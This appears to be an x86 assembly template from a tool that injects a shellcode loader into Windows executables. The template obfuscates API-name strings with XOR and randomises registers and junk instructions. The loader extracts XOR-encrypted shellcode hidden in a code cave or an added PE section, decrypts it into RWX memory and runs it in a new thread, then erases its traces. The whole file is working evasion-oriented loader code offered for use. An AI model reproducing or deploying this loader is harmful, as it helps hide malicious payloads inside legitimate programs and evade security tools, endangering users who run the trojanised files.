.code32

// edi store address of ImageBaseAddress
// esi store address of kernel32.dll
// ebx store address of LoadLibrary
// ebp store address of GetProcAddress
// [esp+0x04] store address of allocated memory page
// [esp+0x08] store address of VirtualAlloc
// [esp+0x0C] store address of VirtualFree
// [esp+0x10] store address of VirtualProtect
// [esp+0x14] store address of CreateThread
// [esp+0x18] store address of WaitForSingleObject

entry:
// ================================ prepare environment ================================

  // ensure stack is 16 bytes aligned
  push ebp                                                     {{igi}}
  mov ebp, esp                                                 {{igi}}
  and esp, 0xFFFFFFF0                                          {{igi}}
  push ebp                                                     {{igi}}

  // reserve stack for store variables
  sub esp, 0x2C                                                {{igi}}

// =============================== get procedure address ===============================

{{if .LackProcedure}}
  // push kernel32 module name to stack
  mov {{.Reg.eax}}, {{index .Kernel32DLLDB  0}}                {{igi}}
  mov {{.Reg.ecx}}, {{index .Kernel32DLLKey 0}}                {{igi}}
  xor {{.Reg.eax}}, {{.Reg.ecx}}                               {{igi}}
  push {{.Reg.eax}}                                            {{igi}}
  mov {{.Reg.ebx}}, {{index .Kernel32DLLDB  1}}                {{igi}}
  mov {{.Reg.edx}}, {{index .Kernel32DLLKey 1}}                {{igi}}
  xor {{.Reg.ebx}}, {{.Reg.edx}}                               {{igi}}
  push {{.Reg.ebx}}                                            {{igi}}
  mov {{.Reg.edx}}, {{index .Kernel32DLLDB  2}}                {{igi}}
  mov {{.Reg.ebp}}, {{index .Kernel32DLLKey 2}}                {{igi}}
  xor {{.Reg.edx}}, {{.Reg.ebp}}                               {{igi}}
  push {{.Reg.edx}}                                            {{igi}}
  mov {{.Reg.edi}}, {{index .Kernel32DLLDB  3}}                {{igi}}
  mov {{.Reg.esi}}, {{index .Kernel32DLLKey 3}}                {{igi}}
  xor {{.Reg.edi}}, {{.Reg.esi}}                               {{igi}}
  push {{.Reg.edi}}                                            {{igi}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.ebx}}, {{index .Kernel32DLLDB  4}}              {{igi}}
    mov {{.Reg.edx}}, {{index .Kernel32DLLKey 4}}              {{igi}}
    xor {{.Reg.ebx}}, {{.Reg.edx}}                             {{igi}}
    push {{.Reg.ebx}}                                          {{igi}}
    mov {{.Reg.edi}}, {{index .Kernel32DLLDB  5}}              {{igi}}
    mov {{.Reg.esi}}, {{index .Kernel32DLLKey 5}}              {{igi}}
    xor {{.Reg.edi}}, {{.Reg.esi}}                             {{igi}}
    push {{.Reg.edi}}                                          {{igi}}
    mov {{.Reg.eax}}, {{index .Kernel32DLLDB  6}}              {{igi}}
    mov {{.Reg.ecx}}, {{index .Kernel32DLLKey 6}}              {{igi}}
    xor {{.Reg.eax}}, {{.Reg.ecx}}                             {{igi}}
    push {{.Reg.eax}}                                          {{igi}}
  {{end}}

  // get pointer to the PEB
  xor {{.Reg.eax}}, {{.Reg.eax}}                               {{igi}}
  mov {{.Reg.eax}}, 0x30                                       {{igi}}
  mov {{.Reg.ebx}}, fs:[{{.Reg.eax}}]                          {{igi}}
  // store image base address
  mov {{.RegN.edi}}, [{{.Reg.ebx}} + 0x08]                     {{igi}}

  // read the LoadLibraryA/W form IAT
  mov {{.RegN.ebx}}, {{.RegN.edi}}                             {{igi}}
  add {{.RegN.ebx}}, {{hex .LoadLibrary}}                      {{igi}}
  mov {{.RegN.ebx}}, [{{.RegN.ebx}}]                           {{igi}}

  // load kernel32.dll
  push esp                 {{igi}} // lpLibFileName
  call {{.RegN.ebx}}       {{igi}} // call LoadLibraryA/W

  // store the handle of kernel32.dll
  mov {{.RegN.esi}}, eax                                       {{igi}}

  // restore stack for kernel32 module name
  {{if .LoadLibraryWOnly}}
    add esp, 7*4                                               {{igi}}
  {{else}}
    add esp, 4*4                                               {{igi}}
  {{end}}

  // read the GetProcAddress form IAT
  mov {{.RegV.eax}}, {{.RegN.edi}}                             {{igi}}
  add {{.RegV.eax}}, {{hex .GetProcAddress}}                   {{igi}}
  mov {{.RegN.ebp}}, [{{.RegV.eax}}]                           {{igi}}

  // get procedure address of VirtualAlloc
  {{if .LackVirtualAlloc}}
    // push procedure name to stack
    mov {{.RegV.eax}}, {{index .VirtualAllocDB  0}}            {{igi}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocKey 0}}            {{igi}}
    xor {{.RegV.eax}}, {{.RegV.ecx}}                           {{igi}}
    push {{.RegV.eax}}                                         {{igi}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocDB  1}}            {{igi}}
    mov {{.RegV.edx}}, {{index .VirtualAllocKey 1}}            {{igi}}
    xor {{.RegV.ecx}}, {{.RegV.edx}}                           {{igi}}
    push {{.RegV.ecx}}                                         {{igi}}
    mov {{.RegV.eax}}, {{index .VirtualAllocDB  2}}            {{igi}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocKey 2}}            {{igi}}
    xor {{.RegV.eax}}, {{.RegV.ecx}}                           {{igi}}
    push {{.RegV.eax}}                                         {{igi}}
    mov {{.RegV.ecx}}, {{index .VirtualAllocDB  3}}            {{igi}}
    mov {{.RegV.edx}}, {{index .VirtualAllocKey 3}}            {{igi}}
    xor {{.RegV.ecx}}, {{.RegV.edx}}                           {{igi}}
    push {{.RegV.ecx}}                                         {{igi}}
    push esp               {{igi}} // lpProcName
    push {{.RegN.esi}}     {{igi}} // hModule
    call {{.RegN.ebp}}     {{igi}} // call GetProcAddress
    // restore stack for procedure name
    add esp, 4*4                                               {{igi}}
    // store procedure address to stack
    mov [esp+0x08], eax                                        {{igi}}
  {{else}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.ecx}}, {{hex .VirtualAlloc}}                   {{igi}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{igi}}
    mov [esp+0x08], {{.RegV.ecx}}                              {{igi}}
  {{end}}

  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    {{if .LackVirtualFree}}
      // push procedure name to stack
      mov {{.RegV.ecx}}, {{index .VirtualFreeDB  0}}           {{igi}}
      mov {{.RegV.eax}}, {{index .VirtualFreeKey 0}}           {{igi}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
      push {{.RegV.ecx}}                                       {{igi}}
      mov {{.RegV.edx}}, {{index .VirtualFreeDB  1}}           {{igi}}
      mov {{.RegV.ecx}}, {{index .VirtualFreeKey 1}}           {{igi}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
      push {{.RegV.edx}}                                       {{igi}}
      mov {{.RegV.eax}}, {{index .VirtualFreeDB  2}}           {{igi}}
      mov {{.RegV.edx}}, {{index .VirtualFreeKey 2}}           {{igi}}
      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{igi}}
      push {{.RegV.eax}}                                       {{igi}}
      push esp             {{igi}} // lpProcName
      push {{.RegN.esi}}   {{igi}} // hModule
      call {{.RegN.ebp}}   {{igi}} // call GetProcAddress
      // restore stack for procedure name
      add esp, 3*4                                             {{igi}}
      // store procedure address to stack
      mov [esp+0x0C], eax                                      {{igi}}
    {{else}}
      mov {{.RegV.ecx}}, {{.RegN.edi}}                         {{igi}}
      add {{.RegV.ecx}}, {{hex .VirtualFree}}                  {{igi}}
      mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                       {{igi}}
      mov [esp+0x0C], {{.RegV.ecx}}                            {{igi}}
    {{end}}
  {{end}}

  // get procedure address of VirtualProtect
  {{if .LackVirtualProtect}}
    // push procedure name to stack
    mov {{.RegV.ecx}}, {{index .VirtualProtectDB  0}}          {{igi}}
    mov {{.RegV.eax}}, {{index .VirtualProtectKey 0}}          {{igi}}
    xor {{.RegV.ecx}}, {{.RegV.eax}}                           {{igi}}
    push {{.RegV.ecx}}                                         {{igi}}
    mov {{.RegV.edx}}, {{index .VirtualProtectDB  1}}          {{igi}}
    mov {{.RegV.ecx}}, {{index .VirtualProtectKey 1}}          {{igi}}
    xor {{.RegV.edx}}, {{.RegV.ecx}}                           {{igi}}
    push {{.RegV.edx}}                                         {{igi}}
    mov {{.RegV.eax}}, {{index .VirtualProtectDB  2}}          {{igi}}
    mov {{.RegV.edx}}, {{index .VirtualProtectKey 2}}          {{igi}}
    xor {{.RegV.eax}}, {{.RegV.edx}}                           {{igi}}
    push {{.RegV.eax}}                                         {{igi}}
    mov {{.RegV.edx}}, {{index .VirtualProtectDB  3}}          {{igi}}
    mov {{.RegV.ecx}}, {{index .VirtualProtectKey 3}}          {{igi}}
    xor {{.RegV.edx}}, {{.RegV.ecx}}                           {{igi}}
    push {{.RegV.edx}}                                         {{igi}}
    push esp               {{igi}} // lpProcName
    push {{.RegN.esi}}     {{igi}} // hModule
    call {{.RegN.ebp}}     {{igi}} // call GetProcAddress
    // restore stack for procedure name
    add esp, 4*4                                               {{igi}}
    // store procedure address to stack
    mov [esp+0x10], eax                                        {{igi}}
  {{else}}
    mov {{.RegV.edx}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.edx}}, {{hex .VirtualProtect}}                 {{igi}}
    mov {{.RegV.edx}}, [{{.RegV.edx}}]                         {{igi}}
    mov [esp+0x10], {{.RegV.edx}}                              {{igi}}
  {{end}}

  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    {{if .LackCreateThread}}
      // push procedure name to stack
      mov {{.RegV.ecx}}, {{index .CreateThreadDB  0}}          {{igi}}
      mov {{.RegV.eax}}, {{index .CreateThreadKey 0}}          {{igi}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
      push {{.RegV.ecx}}                                       {{igi}}
      mov {{.RegV.edx}}, {{index .CreateThreadDB  1}}          {{igi}}
      mov {{.RegV.ecx}}, {{index .CreateThreadKey 1}}          {{igi}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
      push {{.RegV.edx}}                                       {{igi}}
      mov {{.RegV.eax}}, {{index .CreateThreadDB  2}}          {{igi}}
      mov {{.RegV.edx}}, {{index .CreateThreadKey 2}}          {{igi}}
      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{igi}}
      push {{.RegV.eax}}                                       {{igi}}
      mov {{.RegV.edx}}, {{index .CreateThreadDB  3}}          {{igi}}
      mov {{.RegV.ecx}}, {{index .CreateThreadKey 3}}          {{igi}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
      push {{.RegV.edx}}                                       {{igi}}
      push esp             {{igi}} // lpProcName
      push {{.RegN.esi}}   {{igi}} // hModule
      call {{.RegN.ebp}}   {{igi}} // call GetProcAddress
      // restore stack for procedure name
      add esp, 4*4                                             {{igi}}
      // store procedure address to stack
      mov [esp+0x14], eax                                      {{igi}}
    {{else}}
      mov {{.RegV.eax}}, {{.RegN.edi}}                         {{igi}}
      add {{.RegV.eax}}, {{hex .CreateThread}}                 {{igi}}
      mov {{.RegV.eax}}, [{{.RegV.eax}}]                       {{igi}}
      mov [esp+0x14], {{.RegV.eax}}                            {{igi}}
    {{end}}
  {{end}}

  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    {{if .LackWaitForSingleObject}}
      // push procedure name to stack
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectDB  0}}   {{igi}}
      mov {{.RegV.eax}}, {{index .WaitForSingleObjectKey 0}}   {{igi}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
      push {{.RegV.ecx}}                                       {{igi}}
      mov {{.RegV.edx}}, {{index .WaitForSingleObjectDB  1}}   {{igi}}
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectKey 1}}   {{igi}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
      push {{.RegV.edx}}                                       {{igi}}
      mov {{.RegV.eax}}, {{index .WaitForSingleObjectDB  2}}   {{igi}}
      mov {{.RegV.edx}}, {{index .WaitForSingleObjectKey 2}}   {{igi}}
      xor {{.RegV.eax}}, {{.RegV.edx}}                         {{igi}}
      push {{.RegV.eax}}                                       {{igi}}
      mov {{.RegV.edx}}, {{index .WaitForSingleObjectDB  3}}   {{igi}}
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectKey 3}}   {{igi}}
      xor {{.RegV.edx}}, {{.RegV.ecx}}                         {{igi}}
      push {{.RegV.edx}}                                       {{igi}}
      mov {{.RegV.ecx}}, {{index .WaitForSingleObjectDB  4}}   {{igi}}
      mov {{.RegV.eax}}, {{index .WaitForSingleObjectKey 4}}   {{igi}}
      xor {{.RegV.ecx}}, {{.RegV.eax}}                         {{igi}}
      push {{.RegV.ecx}}                                       {{igi}}
      push esp             {{igi}} // lpProcName
      push {{.RegN.esi}}   {{igi}} // hModule
      call {{.RegN.ebp}}   {{igi}} // call GetProcAddress
      // restore stack for procedure name
      add esp, 5*4                                             {{igi}}
      // store procedure address to stack
      mov [esp+0x18], eax                                      {{igi}}
    {{else}}
      mov {{.RegV.ecx}}, {{.RegN.edi}}                         {{igi}}
      add {{.RegV.ecx}}, {{hex .WaitForSingleObject}}          {{igi}}
      mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                       {{igi}}
      mov [esp+0x18], {{.RegV.ecx}}                            {{igi}}
    {{end}}
  {{end}}

{{else}}
  // get pointer to the PEB
  xor {{.Reg.eax}}, {{.Reg.eax}}                               {{igi}}
  mov {{.Reg.eax}}, 0x30                                       {{igi}}
  mov {{.Reg.ebx}}, fs:[{{.Reg.eax}}]                          {{igi}}
  // store image base address
  mov {{.RegN.edi}}, [{{.Reg.ebx}} + 0x08]                     {{igi}}
  // get procedure address of VirtualAlloc
  mov {{.RegV.eax}}, {{.RegN.edi}}                             {{igi}}
  add {{.RegV.eax}}, {{hex .VirtualAlloc}}                     {{igi}}
  mov {{.RegV.eax}}, [{{.RegV.eax}}]                           {{igi}}
  mov [esp+0x08], {{.RegV.eax}}                                {{igi}}
  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.ecx}}, {{hex .VirtualFree}}                    {{igi}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{igi}}
    mov [esp+0x0C], {{.RegV.ecx}}                              {{igi}}
  {{end}}
  // get procedure address of VirtualProtect
  mov {{.RegV.edx}}, {{.RegN.edi}}                             {{igi}}
  add {{.RegV.edx}}, {{hex .VirtualProtect}}                   {{igi}}
  mov {{.RegV.edx}}, [{{.RegV.edx}}]                           {{igi}}
  mov [esp+0x10], {{.RegV.edx}}                                {{igi}}
  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    mov {{.RegV.eax}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.eax}}, {{hex .CreateThread}}                   {{igi}}
    mov {{.RegV.eax}}, [{{.RegV.eax}}]                         {{igi}}
    mov [esp+0x14], {{.RegV.eax}}                              {{igi}}
  {{end}}
  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.ecx}}, {{hex .WaitForSingleObject}}            {{igi}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{igi}}
    mov [esp+0x18], {{.RegV.ecx}}                              {{igi}}
  {{end}}
{{end}} // LackProcedure

// ================================ prepare memory page ================================

  // allocate memory for shellcode
  mov  {{.RegV.eax}}, [esp+0x08]               {{igi}} // address of VirtualAlloc
  mov  {{.RegV.ecx}}, 0x04                     {{igi}} // flProtect PAGE_READWRITE
  push {{.RegV.ecx}}                           {{igi}} // push arugment
  mov  {{.RegV.edx}}, 0x3000                   {{igi}} // flAllocationType MEM_RESERVE|MEM_COMMIT
  push {{.RegV.edx}}                           {{igi}} // push arugment
  mov  {{.RegV.ecx}}, {{hex .MemRegionSize}}   {{igi}} // dwSize
  push {{.RegV.ecx}}                           {{igi}} // push arugment
  xor  {{.RegV.edx}}, {{.RegV.edx}}            {{igi}} // lpAddress
  push {{.RegV.edx}}                           {{igi}} // push arugment
  call {{.RegV.eax}}                           {{igi}} // call VirtualAlloc

  // store allocated memory address
  mov [esp+0x04], eax                          {{igi}}

  // padding garbage data to page
  mov {{.RegV.edx}}, eax                       {{igi}}
  mov {{.RegV.ecx}}, {{hex .EntryOffset}}      {{igi}}
  // calculate a random seed from registers
  add {{.RegV.eax}}, esp                       {{igi}}
  add {{.RegV.eax}}, {{.Reg.ebx}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.ecx}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.edx}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.esi}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.edi}}              {{igi}}
 loop_padding:
  // it will waste some loop but clean code
  call xor_shift                               {{igi}}
  mov [{{.RegV.edx}}], {{.RegV.eax}}           {{igi}}
  // check padding garbage is finish
  inc {{.RegV.edx}}                            {{igi}}
  dec {{.RegV.ecx}}                            {{igi}}
  jnz loop_padding                             {{igi}}

  // adjust memory region protect
  mov  {{.RegV.eax}}, [esp+0x10]               {{igi}} // address of VirtualProtect
  mov  {{.RegV.ecx}}, [esp+0x04]               {{igi}} // lpAddress
  sub esp, 0x04                                {{igi}} // lpflOldProtect
  push esp                                     {{igi}} // push argument
  mov  {{.RegV.edx}}, 0x40                     {{igi}} // flNewProtect PAGE_EXECUTE_READWRITE
  push {{.RegV.edx}}                           {{igi}} // push argument
  mov  {{.RegV.edx}}, {{hex .MemRegionSize}}   {{igi}} // dwSize
  push {{.RegV.edx}}                           {{igi}} // push argument
  mov  {{.RegV.edx}}, {{.RegV.ecx}}            {{igi}} // lpAddress
  push {{.RegV.edx}}                           {{igi}} // push argument
  call {{.RegV.eax}}                           {{igi}} // call VirtualProtect
  add esp, 0x04                                {{igi}} // restore stack for old protect

// ================================= prepare shellcode =================================

{{if .CodeCave}}
  // extract encrypted shellcode from code cave
  push {{.RegN.edi}}                           {{igi}} // save "edi"
  mov {{.RegN.ebx}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
  mov {{.RegN.edi}}, [esp+0x04]                {{igi}} // address of allocated memory page
  add {{.RegN.edi}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
  {{STUB CodeCaveMode STUB}}
  pop {{.RegN.edi}}                            {{igi}} // restore "edi"
{{end}} // CodeCave

{{if or .ExtendSection .CreateSection}}
  // save esi and edi
  push esi                                     {{igi}}
  push edi                                     {{igi}}

  // extract encrypted shellcode from section
  mov esi, {{.RegN.edi}}                       {{igi}} // address of image base
  add esi, {{hex .ShellcodeOffset}}            {{igi}} // address of encrypted shellcode
  mov edi, [esp+0x0C]                          {{igi}} // address of allocated memory page
  add edi, {{hex .EntryOffset}}                {{igi}} // address of shellcode
  mov {{.RegV.ecx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
 loop_extract:
  movsb                                        {{igi}}
  inc esi                                      {{igi}}
  // check extract shellcode is finish
  dec {{.RegV.ecx}}                            {{igi}}
  jnz loop_extract                             {{igi}}

  // decrypt shellcode in the memory page
  mov {{.RegV.eax}}, {{hex .ShellcodeKey}}     {{igi}} // key of encrypted shellcode
  mov {{.RegV.edx}}, [esp+0x0C]                {{igi}} // address of allocated memory page
  add {{.RegV.edx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
  mov {{.RegV.ecx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
 loop_decrypt:
  mov edi, [{{.RegV.edx}}]                     {{igi}}
  xor edi, {{.RegV.eax}}                       {{igi}}
  mov [{{.RegV.edx}}], edi                     {{igi}}
  // update the key with xorshift32
  call xor_shift                               {{igi}}
  // check decrypt shellcode is finish
  add {{.RegV.edx}}, 4                         {{igi}}
  sub {{.RegV.ecx}}, 4                         {{igi}}
  jnz loop_decrypt                             {{igi}}

  // restore edi and esi
  pop edi                                      {{igi}}
  pop esi                                      {{igi}}
{{end}} // SectionMode

// ================================== execute shellcode ==================================

{{if .NeedCreateThread}}
  {{if .NeedJumper}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}           {{igi}} // address of image base
    add {{.RegV.ecx}}, {{hex .JumperOffset}}   {{igi}} // address of jumper
    mov {{.RegV.edx}}, [esp+0x04]              {{igi}} // address of memory page
    add {{.RegV.edx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
  {{else}}
    mov {{.RegV.ecx}}, [esp+0x04]              {{igi}} // address of memory page
    add {{.RegV.ecx}}, {{hex .EntryOffset}}    {{igi}} // address of shellcode
    xor {{.RegV.edx}}, {{.RegV.edx}}           {{igi}} // clear register for lpParameter
  {{end}}

  xor {{.RegV.eax}}, {{.RegV.eax}}             {{igi}} // clear register for push 0
  push {{.RegV.eax}}                           {{igi}} // lpThreadId
  push {{.RegV.eax}}                           {{igi}} // dwCreationFlags
  push {{.RegV.edx}}                           {{igi}} // lpParameter
  push {{.RegV.ecx}}                           {{igi}} // lpStartAddress
  push {{.RegV.eax}}                           {{igi}} // dwStackSize
  push {{.RegV.eax}}                           {{igi}} // lpThreadAttributes
  mov {{.RegV.eax}}, [esp+0x2C]                {{igi}} // address of CreateThread
  call {{.RegV.eax}}                           {{igi}} // call CreateThread

  {{if .NeedWaitThread}}
    mov edx, 0xFFFFFFFF                        {{igi}} // dwMilliseconds, INFINITE
    push edx                                   {{igi}} // push argument
    push eax                                   {{igi}} // hHandle, hThread
    mov {{.RegV.eax}}, [esp+0x20]              {{igi}} // address of WaitForSingleObject
    call {{.RegV.eax}}                         {{igi}} // call WaitForSingleObject
  {{end}}
{{else}}
  mov {{.RegV.eax}}, [esp+0x04]                {{igi}} // address of allocated memory
  add {{.RegV.eax}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
  call {{.RegV.eax}}                           {{igi}} // call shellcode
{{end}}

// =================================== erase shellcode ===================================

{{if .NeedEraseShellcode}}
  // overwrite memory data
  mov {{.RegV.edx}}, [esp+0x04]                {{igi}} // address of memory page
  add {{.RegV.edx}}, {{hex .EntryOffset}}      {{igi}} // address of shellcode
  mov {{.RegV.ecx}}, {{hex .ShellcodeSize}}    {{igi}} // set loop times
  sub {{.RegV.ecx}}, 3                         {{igi}} // adjust loop times
  // calculate a random seed from registers
  add {{.RegV.eax}}, esp                       {{igi}}
  add {{.RegV.eax}}, {{.Reg.ebx}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.ecx}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.edx}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.esi}}              {{igi}}
  add {{.RegV.eax}}, {{.Reg.edi}}              {{igi}}
 loop_erase:
  // it will waste some loop but clean code
  call xor_shift                               {{igi}}
  mov [{{.RegV.edx}}], {{.RegV.eax}}           {{igi}}
  // check erase instruction is finish
  inc {{.RegV.edx}}                            {{igi}}
  dec {{.RegV.ecx}}                            {{igi}}
  jnz loop_erase                               {{igi}}

  // release allocated memory page
  mov {{.RegV.eax}}, [esp+0x0C]                {{igi}} // address of VirtualFree
  mov {{.RegV.ecx}}, [esp+0x04]                {{igi}} // address of allocated memory
  mov {{.RegV.edx}}, 0x8000                    {{igi}} // dwFreeType MEM_RELEASE
  push {{.RegV.edx}}                           {{igi}} // push argument
  xor {{.RegV.edx}}, {{.RegV.edx}}             {{igi}} // dwSize
  push {{.RegV.edx}}                           {{igi}} // push argument
  push {{.RegV.ecx}}                           {{igi}} // lpAddress
  call {{.RegV.eax}}                           {{igi}} // call VirtualFree
{{end}}

// ================================== clean environment ==================================

  // clear volatile register that store sensitive data
  xor {{.RegN.edi}}, {{.RegN.edi}}                             {{igi}}
  xor {{.RegN.esi}}, {{.RegN.esi}}                             {{igi}}
  xor {{.RegN.ebx}}, {{.RegN.ebx}}                             {{igi}}
  xor {{.RegN.ebp}}, {{.RegN.ebp}}                             {{igi}}

  // clear stack that store sensitive data
  mov [rsp+0x04], {{.RegN.edi}}                                {{igi}}
  mov [rsp+0x08], {{.RegN.esi}}                                {{igi}}
  mov [rsp+0x0C], {{.RegN.ebx}}                                {{igi}}
  mov [rsp+0x10], {{.RegN.ebp}}                                {{igi}}
  mov [rsp+0x14], {{.RegN.edi}}                                {{igi}}
  mov [rsp+0x18], {{.RegN.esi}}                                {{igi}}

  // restore stack for store variables
  add esp, 0x2C                                                {{igi}}

  // restore stack and ebp
  pop ebp                                                      {{igi}}
  mov esp, ebp                                                 {{igi}}
  pop ebp                                                      {{igi}}

  // mark the end of loader
  {{db .EndOfLoader}}

// ====================================== function =======================================

xor_shift:
  push {{.RegV.ecx}}                                           {{igi}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{igi}}
  shl {{.RegV.ecx}}, 13                                        {{igi}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{igi}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{igi}}
  shr {{.RegV.ecx}}, 17                                        {{igi}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{igi}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{igi}}
  shl {{.RegV.ecx}}, 5                                         {{igi}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{igi}}
  pop {{.RegV.ecx}}                                            {{igi}}
  ret                                                          {{igi}}
